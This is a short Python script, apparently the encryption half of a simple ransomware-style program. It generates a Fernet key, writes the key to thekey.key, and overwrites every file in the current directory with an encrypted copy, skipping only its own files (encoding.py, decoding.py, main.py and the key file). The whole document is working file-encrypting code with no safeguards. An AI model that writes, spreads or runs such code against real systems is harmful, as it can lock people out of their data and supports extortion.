from cryptography.fernet import Fernet
import os

def encode():
    key=Fernet.generate_key()
    f=Fernet(key)

    files=[]
    for file in os.listdir():
        if file=="encoding.py" or file =="thekey.key" or file=="decoding.py" or file=="main.py":
            continue
        if os.path.isfile(file):
            files.append(file)
    print("Files to be encrypted:",files)

    with open("thekey.key",'wb') as thekey:
        thekey.write(key)

    for file in files:
        with open(file,'rb') as thefile:
            contents=thefile.read()
        contents_encrypted = f.encrypt(contents)
        with open(file,'wb') as thefile:
            thefile.write(contents_encrypted)
            print("Files encrypted")


